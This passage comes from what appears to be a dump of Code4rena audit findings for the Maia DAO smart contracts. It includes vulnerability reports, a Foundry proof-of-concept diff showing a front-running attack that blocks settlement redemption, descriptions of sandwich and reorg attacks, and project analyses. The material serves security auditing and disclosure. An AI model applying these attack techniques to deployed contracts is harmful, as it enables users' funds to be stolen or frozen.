[here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Audinarey-Analysis.md)."}, {"title": "`RootBridgeAgent.redeemSettlement` can be front-run using `RootBridgeAgent.retrySettlement` causing redeem DoS", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/869", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L268   # Vulnerability details  ## Impact Since [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252) can be called by **anyone** for **any** settlement, a malicious actor can front-run an user trying to redeem his failed settlement via [RootBridgeAgent.redeemSettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L254-L268) by calling [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252) with `_remoteExecutionGas = 0` in order to make sure that this settlement will also fail in the future.    As a consequnce, the user's subsequent call to [RootBridgeAgent.redeemSettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L254-L268) [will revert](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L260-L261) (DoS) because the settlement was [already marked](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L577) with `SettlementStatus.Success` during the malicious actor's call to [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252). Therefore the user is unable to redeem his assets.  ## Proof of Concept The following PoC modifies an existing test case to confirm the above claims resulting in: * The settlement being marked with `SettlementStatus.Success`. * DoS of [RootBridgeAgent.redeemSettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L254-L268) method for this settlement. * **The user not being able to redeem his assets.**  Just apply the *diff* below and run the test with `forge test --match-test testRedeemSettlement`:  ```diff diff --git a/test/ulysses-omnichain/RootTest.t.sol b/test/ulysses-omnichain/RootTest.t.sol index ea88453..ccd7ad2 100644 --- a/test/ulysses-omnichain/RootTest.t.sol +++ b/test/ulysses-omnichain/RootTest.t.sol @@ -1299,14 +1299,13 @@ contract RootTest is DSTestPlus {          hevm.deal(_user, 1 ether);            //Retry Settlement -        multicallBridgeAgent.retrySettlement{value: 1 ether}(settlementNonce, 0.5 ether);            settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);            require(settlement.status == SettlementStatus.Success, \"Settlement status should be success.\");      }   -    function testRedeemSettlement() public { +    function testRedeemSettlementFrontRunDoS() public {          //Set up          testAddLocalTokenArbitrum();   @@ -1389,15 +1388,25 @@ contract RootTest is DSTestPlus {            require(settlement.status == SettlementStatus.Failed, \"Settlement status should be failed.\");   -        //Retry Settlement -        multicallBridgeAgent.redeemSettlement(settlementNonce); +        //Front-run redeem settlement with '_remoteExecutionGas = 0' +        address _malice = address(0x1234); +        hevm.deal(_malice, 1 ether); +        hevm.prank(_malice); +        multicallBridgeAgent.retrySettlement{value: 1 ether}(settlementNonce, 0 ether);            settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce); +        require(settlement.status == SettlementStatus.Success, \"Settlement status should be success.\");   -        require(settlement.owner == address(0), \"Settlement should cease to exist.\"); +        //Redeem settlement DoS cause settlement is marked as success +        hevm.expectRevert(abi.encodeWithSignature(\"SettlementRedeemUnavailable()\")); +        multicallBridgeAgent.redeemSettlement(settlementNonce); + +        settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce); +        require(settlement.owner != address(0), \"Settlement should still exist.\");   +        //User couldn't redeem funds          require( -            MockERC20(newAvaxAssetGlobalAddress).balanceOf(_user) == 150 ether, \"Settlement should have been redeemed\" +            MockERC20(newAvaxAssetGlobalAddress).balanceOf(_user) == 0 ether, \"Settlement should not have been redeemed\"          );      }   ```  ## Tools Used VS Code, Foundry  ## Recommended Mitigation Steps I suggest to only allow calls to [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252) by the settlement owner:  ```diff diff --git a/src/ulysses-omnichain/RootBridgeAgent.sol b/src/ulysses-omnichain/RootBridgeAgent.sol index 34f4286..4acef39 100644 --- a/src/ulysses-omnichain/RootBridgeAgent.sol +++ b/src/ulysses-omnichain/RootBridgeAgent.sol @@ -242,6 +242,14 @@ contract RootBridgeAgent is IRootBridgeAgent {        /// @inheritdoc IRootBridgeAgent      function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable { +        //Get deposit owner. +        address depositOwner = getSettlement[_settlementNonce].owner; +        if ( +            msg.sender != depositOwner && msg.sender != address(IPort(localPortAddress).getUserAccount(depositOwner)) +        ) { +            revert NotSettlementOwner(); +        } +          //Update User Gas available.          if (initialGas == 0) {              userFeeInfo.depositedGas = uint128(msg.value);  ```    ## Assessed type  DoS"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/868", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-04"], "target": "2023-05-maia-findings", "body": "# Description\r \r ## Hermes\r \r Hermes is a protocol built around its main token bHermes, which is earned from staking Hermes token. bHermes is then split into 3 utility tokens, each with a separate use:\r \r **BHermes Gauge**: Vote on gauges and receive a proportion of the gauges\u2019 revenue \r \r **BHermes Boost:** Earn boosted rewards by providing liquidity to a gauge \r \r **BHermes Votes**: Vote on governance proposals such as adding/removing gauges, bribes, partners, etc.\r \r Hermes also introduces a gauge system, where the users can stake their UniV3 position NFTs and earn rewards. Moreover, these rewards can be boosted (using the BoostAggregator contract) up to a maximum of 2.5x. The new version also introduces ERC4626 deposit-only vaults where the burn rate is increased allowing users to vote once. \r \r ## Maia\r \r Maia DAO is the cornerstone of the Maia protocol. It is an aggregator for Talos and Hermes. Users can earn rewards by staking their $Maia(native) into vMaia(ERC4626 compliant token), leveraging their vMaia to participate in Maia governance, and earning bribes like in Talos (rewards from vault strategy revenue). \r \r The utilities earned by the user are weight and governance but not boost, this is because Maia\u2019s treasury hosts a boost aggregator with Talos Positions to enable further accumulation of hermes.\r \r ## Talos\r \r Talos builds upon the gauge system by introducing strategies. These strategies rebalance and rerange a Uniswap V3 position portfolio based on settings set in an optimizer contract. These strategies come in 2 forms. Vanilla and staked. The Vanilla Strategy is a strategy where Uniswap V3 positions are left in pools to collect liquidity fees. The Staked Strategy,u in contrast, takes Uniswap V3 positions and stakes them into Uniswap V3 gauges where users can earn Hermes emissions instead of using the Uniswap V3 staker implementation. \r \r UniV3 ensures that positions are staked in tick ranges with the highest liquidity to ensure the highest rewards, the need for rebalance/rerange occurs when the position deviates from the tick spacing (deviation) defined.\r \r An important component of the Talos system is flywheel contracts. These contracts manage the token incentive distribution from Talos strategies. This helps to protect against exploits and ensure the safe and fair distribution of strategy rewards.\r \r ## Ulysses\r \r Ulysses is an ominchain protocol inspired by layer0 that provides capital efficiency across multiple chains. It attempts to solve the bridging trilemma problem involved with the growing demand to move tokens across multiple chains. Ulysses allows users to provide liquidity and earn fees across chains as well as allows users to seamlessly move assets across chains. It accomplishes this with a branch port system where each chain has a branch router and a branch port that communicates with the root router and the root port on the root chain (Arbitrum). The interaction between branch chains and the root chain is facilitated by a BridgeAgent that exists on each chain. The underlying cross-chain communication protocol is not Maia's own implementation. Instead, Ulysses uses [Multichain anyCall v7](https://docs.multichain.org/developer-guide/anycall-v7) under the hood.\r \r The root chain keeps a virtual account of users that manages their balances across chains. This allows users to leverage their virtual account to participate in many activities on the root chain.\r \r When inspecting Ulysses some noteworthy patterns were discovered:\r \r ### Pattern to prevent frontrunning contract initialization\r \r In other contests, it was frequently discussed whether frontrunning an initialize() call on a freshly deployed contract was noteworthy. And if so the severity of this was usually in question. Because usually, the project could just redeploy that contract. Reviewing the Ulysses contracts a pattern was noted that spares this discussion:\r \r 1. The constructor is called and sets the owner\r 2. The initialize() function can only be called by the owner due to its \u201conlyOwner\u201d modifier\r 3. Within the initialize() function the ownership is renounced and the contract becomes permissionless\r \r ### Mappings are named like functions\r \r Mappings in Ulysses are named like functions and therefore accessing a value for a key feels like a \u201cget\u201d function call. This is the first code base inspected where this naming convention was found. Here is an example: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L122\r \r # Approach\r \r We divided the audit into 4 parts. Hermes, Maia, Talos and Ulysses. We started with Hermes, then Maia, then Talos, and then Ulysses. This is because the first 3 are interconnected particularly due to Maia being an aggregator for both Talos and Hermes.\r \r # Architecture\r \r ## Hermes\r \r ![Hermes](https://cdn.discordapp.com/attachments/1113968578643886172/1125564901033771048/image.png)\r \r ## Maia\r \r ![Maia](https://cdn.discordapp.com/attachments/1113968578643886172/1125564630777987102/image.png)\r \r ## Talos\r ![Talos](https://cdn.discordapp.com/attachments/1113968578643886172/1125564303995580496/image.png)\r \r ## Ulysses\r \r Ulysses-AMM\r \r ![Ulysses-AMM](https://cdn.discordapp.com/attachments/1113968578643886172/1125563646651678780/image.png)\r \r # Codebase Quality\r \r Overall, we believe that the codebase quality for Maia DAO is very good. Codebase is very mature and has clearly undergone extensive testing. We notice the employment of various standards, including ERC20, ERC721, and ERC2646. We also noticed that some sections of the codebase take inspiration from protocols such as popsicle finance and layer 0. Details are explained below \r \r | Codebase Quality Categories  | Comments |\r | --- | --- |\r | Unit Testing  | Codebase is extensively well-tested using the Foundry framework. The inclusion of fuzz tests was great to see. It is worth noting that some of the test files are too large and it would be beneficial to separate them for better readability. |\r | Code Comments  | Comments in general were solid but there are many sections in the codebase where the comments were either outdated or incorrect. |\r | Documentation | The documentation overall is fantastic and does a great job of explaining the ecosystem. It would be helpful, however, if the docs explained how the ecosystem works from a basic contract level so that it is easier to digest for developers looking to integrate into the Maia ecosystem |\r | Organization | Codebase is very mature and well organized with clear distinctions between the 4 protocols, their respective  factories, interfaces, etc |\r | Static Analysis | Codebase makes great use of Slither which is an industry standard tool for static analysis |\r \r # Systemic/Centralization Risks\r \r ## Global\r \r 1. It is important to note that since factories in the ecosystem are permissionless by design, a user can create contracts with poisonous characteristics or just create an infinite amount of contracts, creating potential vulnerabilities such as DOS attacks \r 2. This can also result in risks related to social engineering such as phishing attacks.\r \r ## Hermes\r \r 1. It is possible that the V3 staker is vulnerable to a Sybil-type attack, where a user can create multiple Uniswap LP NFTs to stake and earn Hermes emission at the expense of everyone else.\r \r ## Maia\r \r 1. Whales with huge pockets can bribe voters and essentially control the ecosystem.\r 2. The cost of accepting a proposal is at a fixed cost of ETH. If the price of ETH grows, this will be a problem for future proposals. \r \r ## Talos\r \r The ecosystem of Talos carries some noteworthy systemic risks: \r \r 1. There is a possibility that a Uniswap pool can be removed, disabling several functions. \r 2. Having unprotected functions in the Talos Manager contract could open the door to future vulnerabilities \r 3. On the surface, it doesn\u2019t make sense for a user to not use the Talos Strategy Vanilla over Staked as a user should be able to collect fees while also receiving Hermes emissions at the same time.\r \r ## Ulysses\r \r 1. There is a possibility of unexpected results if an L2 chain goes down \r 2. Each chain has some differences from one another, and it may be possible that some chains do not synchronize well with others due to differences in block timing. This may be a problem when managing funds across chains. \r 3. Maia should be aware of possible cross chain MEV attacks between Arbitrum and another chain. If there is a large discrepancy in the price of an asset between chains, then assets within a chain port could be drained via swaps.\r \r # Recommendations\r \r 1. While the documentation for the codebase is excellent, the contract flow is not particularly clear as a user can enter the ecosystem in various ways. This may be in part due to the permissionless nature of the ecosystem. It is recommended that the docs are updated to describe important contracts and their functions.\r 2. There are many areas where the documentation is either incorrect or simply does not match the code. It is recommended to keep Natspecs up to date to avoid confusion.\r 3. Throughout the codebase, there is repeated use of functions with the same or even similar names. It is recommended to avoid this practice as it makes the code very confusing and may have unintended consequences by calling the wrong function.\r 4. Many contracts have unused imports, unused variables, or even inherit from a contract whose functionality is in the end not used (Ownable). A thorough scan of the codebase should be done to clean this up.\r 5. Too much inheritance and nested functions can make certain functions difficult to read and audit. Consider reducing this if possible as this can make the code more readable and reveal potential bugs. e.g. Is there really a need to have TalosBaseSimple.sol when the functions could have been written in TalosBaseStrategy or TalosStrategyStaked? \r 6. Since the codebase relies on 3rd party integrations like Uniswap, it is essential to ensure that these 3rd parties are secure, in short, the risks of integrating from a third party should be noted.\r 7. We have noticed that there are a lot of interface functions that do not exist in the actual contract. It is recommended to have these unneeded functions remo"}, {"title": "Many `create` methods are suspicious of the reorg attack", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/861", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/TalosStrategyStaked.sol#L28   # Vulnerability details  ## Proof of Concept  There are many instance of this, but to understand things better, taking the example of `createTalosV3Strategy` method.  The `createTalosV3Strategy` function deploys a new `TalosStrategyStaked` contract using the create, where the address derivation depends only on the arguments passed.  At the same time, some of the chains like Arbitrum and Polygon are suspicious of the reorg attack.  ```solidity File: TalosStrategyStaked.sol    function createTalosV3Strategy(         IUniswapV3Pool pool,         ITalosOptimizer optimizer,         BoostAggregator boostAggregator,         address strategyManager,         FlywheelCoreInstant flywheel,         address owner     ) public returns (TalosBaseStrategy) {         return new TalosStrategyStaked( // @audit-issue Reorg Attack                 pool,                 optimizer,                 boostAggregator,                 strategyManager,                 flywheel,                 owner             );     }  ``` [Link to Code](https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/TalosStrategyStaked.sol#L28)  Even more, the reorg can be couple of minutes long. So, it is quite enough to create the `TalosStrategyStaked` and transfer funds to that address using `deposit` method, especially when someone uses a script, and not doing it by hand.  Optimistic rollups (Optimism/Arbitrum) are also suspect to reorgs since if someone finds a fraud the blocks will be reverted, even though the user receives a confirmation.  Same issue can affect factory contracts in Ulysses omnichain contracts as well with more severe consequences.  Can refer this an issue previously report [here](https://code4rena.com/reports/2023-04-frankencoin#m-14-re-org-attack-in-factory) to have more understanding about it.  ## Impact  Exploits involving Stealing of funds.  ## Tools Used  VS Code  ## Recommended Mitigation Steps  Deploy such contracts via `create2` with `salt`.   ## Assessed type  Other"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/842", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-07"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Raihan-G.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/840", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-05"], "target": "2023-05-maia-findings", "body": "## **Hermes Analysis**\r \r ### **Approach**\r \r The process of auditing the Hermes protocol started with a review of the tokens implementation and management contracts. This included a review of the ERC20 Boost, Gauge & Vote tokens, as well as the UtilityManagement contract. The team then proceeded to review the distribution of awards (\"emissions\") over new epochs contained within the \"Flywheel\" contracts. The final step involved reviewing the Uniswap Staker Incentive mechanics and the novel additions made by the developers.\r \r ### **Architecture**\r \r The architecture of the novel tokens is well-composed, with abstract contracts that are easy to follow. The developers took inspiration from OpenZeppelin's ERC20 Votes contract for the ERC20MultiVotes, and the novel contracts seem to follow the general idea and implementation with a few minor differences. However, the architecture of the rewards distribution part, i.e., the \"Flywheel\" contracts, was more challenging to grasp. There were some inconveniences, such as having two different contracts (one abstract and one implementation) with the same contract name \"FlywheelCore\", the naming of contracts was very similar to each other and overall a lack of well-structured documentation in that part of the project. Moreover, user entry points could be better defined. Lastly, the new Uniswap Staker contract follows the main functionality of the original one; however, there are notable differences considering access control.\r \r Overall, the recommendation for the Hermes protocol would be to improve the naming of contracts, design high-level architecture resources such as diagrams, user and contract interaction flows from the perspective of different participants, and expand further on the documentation.\r \r ### **Centralization Risks**\r \r There is a substantial centralization risk due to the use of many\u00a0**`onlyOwner`**\u00a0modifiers. However, for a project of this size, it is hard to completely avoid them. If the developers follow a roadmap that steadily transfers the ownership to the DAO, then the centralization risks would be mitigated, and trust in the ecosystem would improve.\r \r ### **Testability**\r \r This is an area where we think the developers did an outstanding job. Although test coverage could be higher and include more complex scenarios, we found implementing PoCs extremely easy and trouble-free. This makes us believe that the testability of Hermes is flexible and would be easy to build on with more tests and end-to-end scenarios.\r \r ## **Omnichain Analysis**\r \r ### **Approach**\r \r The process of auditing Ulysses-Omnichain started by creating and reviewing the architecture from a high-level perspective, using visualization tools. The audit continued with a thorough review of the contracts, starting with the Branch Chain contracts (Routers, BridgeAgent, BranchPort), followed by a review of the Root Chain contracts (Routers, RootBridgeAgent, RootPort, MulticallRouter), and the Arbitrum specific contracts. The provided test suite was extensively used both to gather more context on the system and to develop PoCs for any identified issues.\r \r ### **Architecture**\r \r The Omnichain system aims to implement cross-chain messaging and asset transfer, which is naturally a complex challenge and inherently requires complex code. The architecture is difficult to grasp, however, after thorough review, we conclude that it is of high enough quality to efficiently achieve the underlying task. The developers incorporate Multichain as the off-chain component that will transfer messages across different chains. Multichain is a robust and easy-to-integrate cross-chain messaging framework, and the developers have made a very informed choice here. The implementation of the Ports and BridgeAgents is of high quality. However, the Routers seem to contain functionality that needs to be extended by dApp developers. Moreover, some of the provided Router contracts had functions that weren't implemented (reverting by default), making it difficult to assess whether there could be potential issues arising from that. There are parts of the Root & Branch BridgeAgent\u2019s implementation such as the\u00a0`anyExecute`\u00a0functions that are very long and complex that could benefit from extraction in another contract for better readability. Documentation should also be expanded upon and include high-level architecture resources such as diagrams, user & contract interaction flows from the perspective of different participants. Main area of concern that could contain more severe issues are gas payments.\r \r ### **Centralization Risks**\r \r The centralization risks mainly revolve around the deployed factories. To mitigate these risks and improve trust in the ecosystem, it is recommended that the developers follow a roadmap for gradually transferring ownership to the DAO.\r \r ### **Testability**\r \r While the test suite has some flaws, such as lengthy and hard-to-follow setup functions, and a lack of complex tests involving nested operations within the\u00a0**`anyExecute`**\u00a0call, the overall testability of the system is commendable. Once the setup is understood, experimenting, developing tests, and implementing PoCs become easy. The developers have provided a high-quality testing sandbox for implementing, testing, and expanding ideas.\r \r ## **Conclusion**\r \r In conclusion, the developers have done an excellent job of implementing an ecosystem that encompasses AMM, Rewards, Voting, Staking, and Cross-chain messaging. Conducting an audit significantly contributes to securing the project, but security in large codebases should be an ongoing process. It is highly recommended that the team continues to invest in security measures such as mitigation reviews, audits, and bug bounty programs to maintain the project's security and reliability."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/834", "labels": ["grade-a", "satisfactory", "selected for report", "sponsor confirmed", "analysis-advanced", "A-06"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/7e1e-Analysis.md)."}, {"title": "Use of slot0 to get sqrtPriceLimitX96 can lead to price manipulation.", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/823", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/cfed0dfa3bebdac0993b1b42239b4944eb0b196c/src/ulysses-omnichain/RootBridgeAgent.sol#L674 https://github.com/code-423n4/2023-05-maia/blob/cfed0dfa3bebdac0993b1b42239b4944eb0b196c/src/ulysses-omnichain/RootBridgeAgent.sol#L717   # Vulnerability details  ## Impact In the `RootBrigdeAgent.sol` the function's `_gasSwapOut` and `_gasSwapIn` uses `UniswapV3.slot0` to get the value of `sqrtPriceX96` which it use to perform the swap, however the `sqrtPriceX96` gotten from `Uniswap.slot0` is the most recent data point and can be manipulated easily via `MEV` bots & `Flashloans`\u26a1\ufe0f with sandwich attacks can cause lose of funds when interact with the `Uniswap.swap` function.  ## Proof of Concept You can see the `_gasSwapIn` function in the `RootBrigdeAgent.sol` [Link here](https://github.com/code-423n4/2023-05-maia/blob/cfed0dfa3bebdac0993b1b42239b4944eb0b196c/src/ulysses-omnichain/RootBridgeAgent.sol#L674C1-L689C75)  ```solidity       //Get sqrtPriceX96         (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(poolAddress).slot0();          // Calculate Price limit depending on pre-set price impact         uint160 exactSqrtPriceImpact = (sqrtPriceX96 * (priceImpactPercentage / 2)) / GLOBAL_DIVISIONER;          //Get limit         uint160 sqrtPriceLimitX96 =             zeroForOneOnInflow ? sqrtPriceX96 - exactSqrtPriceImpact : sqrtPriceX96 + exactSqrtPriceImpact;          //Swap imbalanced token as long as we haven't used the entire amountSpecified and haven't reached the price limit         try IUniswapV3Pool(poolAddress).swap(             address(this),             zeroForOneOnInflow,             int256(_amount),             sqrtPriceLimitX96,             abi.encode(SwapCallbackData({tokenIn: gasTokenGlobalAddress})) ``` and You can see the `_gasSwapOut` function in the `RootBrigdeAgent.sol` [Link here](https://github.com/code-423n4/2023-05-maia/blob/cfed0dfa3bebdac0993b1b42239b4944eb0b196c/src/ulysses-omnichain/RootBridgeAgent.sol#L717C1-L734C11)  ```solidity    (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(poolAddress).slot0();              // Calculate Price limit depending on pre-set price impact             uint160 exactSqrtPriceImpact = (sqrtPriceX96 * (priceImpactPercentage / 2)) / GLOBAL_DIVISIONER;              //Get limit             sqrtPriceLimitX96 =                 zeroForOneOnInflow ? sqrtPriceX96 + exactSqrtPriceImpact : sqrtPriceX96 - exactSqrtPriceImpact;         }          //Swap imbalanced token as long as we haven't used the entire amountSpecified and haven't reached the price limit         (int256 amount0, int256 amount1) = IUniswapV3Pool(poolAddress).swap(             address(this),             !zeroForOneOnInflow,             int256(_amount),             sqrtPriceLimitX96,             abi.encode(SwapCallbackData({tokenIn: address(wrappedNativeToken)}))         ); ```  The both use the the `sqrtPriceX96` gotten from `Uniswap.slot0`  An Attacker can Simply manipulate the `sqrtPriceX96` and if the `Uniswap.swap` function is called with the `sqrtPriceX96` the token will be bought at a higher price, and The Attacker would back run the transaction to sell thereby making gain but causing loss to whoever called those functions.  ## Tools Used `Manual Analysis` ## Recommended Mitigation Steps Use The `TWAP` to get the value of `sqrtPriceX96`.   ## Assessed type  MEV"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/821", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/JCN-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/809", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-07"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/peanuts-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/796", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-11"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/JCN-G.md)."}, {"title": "Replenishing gas is missing in `_payFallbackGas` of RootBridgeAgent", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/786", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L831-L846   # Vulnerability details  ## Impact `_payFallbackGas` is used to update the user deposit with the amount of gas needed to pay for the fallback function execution.  However, it doesn't replenish gas. In other words, it doesn't deposit the executionGasSpent into AnycallConfig execution budget.  ## Proof of Concept  Here is the method body.  ```solidity  function _payFallbackGas(uint32 _settlementNonce, uint256 _initialGas) internal virtual {   //Save gasleft   uint256 gasLeft = gasleft();    //Get Branch Environment Execution Cost   uint256 minExecCost = tx.gasprice * (MIN_FALLBACK_RESERVE + _initialGas - gasLeft);    //Check if sufficient balance   if (minExecCost > getSettlement[_settlementNonce].gasToBridgeOut) {    _forceRevert();    return;   }    //Update user deposit reverts if not enough gas   getSettlement[_settlementNonce].gasToBridgeOut -= minExecCost.toUint128();  } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L831-L846  As you can see, no gas replenishing call.  `_payFallbackGas` is called at the end in `anyFallback` after reopening  user's settlement.  ```solidity  function anyFallback(bytes calldata data)   external   virtual   requiresExecutor   returns (bool success, bytes memory result)  {   //Get Initial Gas Checkpoint   uint256 _initialGas = gasleft();    //Get fromChain   (, uint256 _fromChainId) = _getContext();   uint24 fromChainId = _fromChainId.toUint24();    //Save Flag   bytes1 flag = data[0];    //Deposit nonce   uint32 _settlementNonce;    /// SETTLEMENT FLAG: 1 (single asset settlement)   if (flag == 0x00) {    _settlementNonce = uint32(bytes4(data[PARAMS_START_SIGNED:25]));    _reopenSettlemment(_settlementNonce);     /// SETTLEMENT FLAG: 1 (single asset settlement)   } else if (flag == 0x01) {    _settlementNonce = uint32(bytes4(data[PARAMS_START_SIGNED:25]));    _reopenSettlemment(_settlementNonce);     /// SETTLEMENT FLAG: 2 (multiple asset settlement)   } else if (flag == 0x02) {    _settlementNonce = uint32(bytes4(data[22:26]));    _reopenSettlemment(_settlementNonce);   }   emit LogCalloutFail(flag, data, fromChainId);    _payFallbackGas(_settlementNonce, _initialGas);    return (true, \"\");  } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L1177  ## Tools Used Manual analysis  ## Recommended Mitigation Steps  Withdraw Gas from port, unwrap it, then call _replenishGas to top up the execution budget   ## Assessed type  Other"}, {"title": "setWeight() Logic error", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/766", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-03"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesPool.sol#L223   # Vulnerability details  ## Impact Logic error  ## Proof of Concept `setWeight()`Used to set the new weight The code is as follows: ```solidity     function setWeight(uint256 poolId, uint8 weight) external nonReentrant onlyOwner {         if (weight == 0) revert InvalidWeight();          uint256 poolIndex = destinations[poolId];          if (poolIndex == 0) revert NotUlyssesLP();          uint256 oldRebalancingFee;          for (uint256 i = 1; i < bandwidthStateList.length; i++) {             uint256 targetBandwidth = totalSupply.mulDiv(bandwidthStateList[i].weight, totalWeights);              oldRebalancingFee += _calculateRebalancingFee(bandwidthStateList[i].bandwidth, targetBandwidth, false);         }          uint256 oldTotalWeights = totalWeights;         uint256 weightsWithoutPool = oldTotalWeights - bandwidthStateList[poolIndex].weight;         uint256 newTotalWeights = weightsWithoutPool + weight;         totalWeights = newTotalWeights;          if (totalWeights > MAX_TOTAL_WEIGHT || oldTotalWeights == newTotalWeights) {             revert InvalidWeight();         }          uint256 leftOverBandwidth;          BandwidthState storage poolState = bandwidthStateList[poolIndex];         poolState.weight = weight; @>      if (oldTotalWeights > newTotalWeights) {             for (uint256 i = 1; i < bandwidthStateList.length;) {                 if (i != poolIndex) {                     uint256 oldBandwidth = bandwidthStateList[i].bandwidth;                     if (oldBandwidth > 0) {                         bandwidthStateList[i].bandwidth =                             oldBandwidth.mulDivUp(oldTotalWeights, newTotalWeights).toUint248();                         leftOverBandwidth += oldBandwidth - bandwidthStateList[i].bandwidth;                     }                 }                  unchecked {                     ++i;                 }             }             poolState.bandwidth += leftOverBandwidth.toUint248();         } else {             uint256 oldBandwidth = poolState.bandwidth;             if (oldBandwidth > 0) { @>              poolState.bandwidth = oldBandwidth.mulDivUp(oldTotalWeights, newTotalWeights).toUint248();                  leftOverBandwidth += oldBandwidth - poolState.bandwidth;             }              for (uint256 i = 1; i < bandwidthStateList.length;) {                                 if (i != poolIndex) {                      if (i == bandwidthStateList.length - 1) { @>                       bandwidthStateList[i].bandwidth += leftOverBandwidth.toUint248();                      } else if (leftOverBandwidth > 0) { @>                       bandwidthStateList[i].bandwidth += @>                          leftOverBandwidth.mulDiv(bandwidthStateList[i].weight, weightsWithoutPool).toUint248();                      }                 }                  unchecked {                     ++i;                 }             }         } ```  There are several problems with the above code 1. `if (oldTotalWeights > newTotalWeights)` should be changed to `if (oldTotalWeights < newTotalWeights)` because the logic inside the if is to calculate the case of increasing `weight`  2. `poolState.bandwidth = oldBandwidth.mulDivUp(oldTotalWeights , newTotalWeights).toUint248();` should be modified to `poolState.bandwidth = oldBandwidth.mulDivUp(newTotalWeights, oldTotalWeights).toUint248();` Because this calculates the extra number  3. 